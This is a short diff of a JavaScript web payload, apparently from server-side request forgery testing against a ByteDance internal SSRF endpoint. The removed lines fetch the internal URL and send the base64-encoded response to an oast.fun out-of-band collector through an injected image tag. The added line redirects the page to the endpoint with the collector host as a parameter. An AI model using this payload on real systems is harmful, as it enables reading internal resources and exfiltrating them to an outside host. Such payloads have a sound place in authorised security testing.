@@ -1,8 +1,3 @@
 <script>
-    exfil = new XMLHttpRequest();
-    exfil.open("GET", "https://src-ssrf.bytedance.net/ssrf");
-    exfil.send();
-    exfil.onload = function() {
-        document.write('<img src="etbkflgycsmhaaldnsvpgwk58kx9ogihm.oast.fun?x=' + btoa(this.responseText) + '" >');
-    };
+document.location="https://src-ssrf.bytedance.net/ssrf?host=etbkflgycsmhaaldnsvpgwk58kx9ogihm.oast.fun";
 </script>
